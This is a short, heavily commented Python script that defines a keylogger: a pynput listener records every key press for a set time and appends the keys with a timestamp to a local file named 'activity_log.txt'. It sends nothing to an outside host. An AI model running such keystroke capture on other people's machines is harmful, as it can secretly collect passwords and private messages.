#This script captures keyboard input for a set time and saves it to a file.

from pynput import keyboard    #It is used for listen to keyboard events.
from datetime import datetime  #Get the current date and time.
import threading  #

def start_keylogger(duration = 30, output_file = "data/activity_log.txt"):
    keys = []  #empty list to store the keys.

    def on_press(key):
        keys.append(str(key))  #It adds the key to the list as a string.
    #Start a backgroung listener for keyboard input.
    listener = keyboard.Listener(on_press = on_press)  
    listener.start()

    def stop():  #This function to stop listening after time is up.
        listener.stop()  
        # Opens the log file in append mode'a'.
        with open(output_file, "a") as f:
            #Writes the current date/time and all recorded keys to the file.
            f.write(f"\n--{datetime.now()}--\n")
            f.write("".join(keys))
    #After duration seconds, the stop() is triggered and automatically ends and save data.
    threading.Timer(duration, stop).start()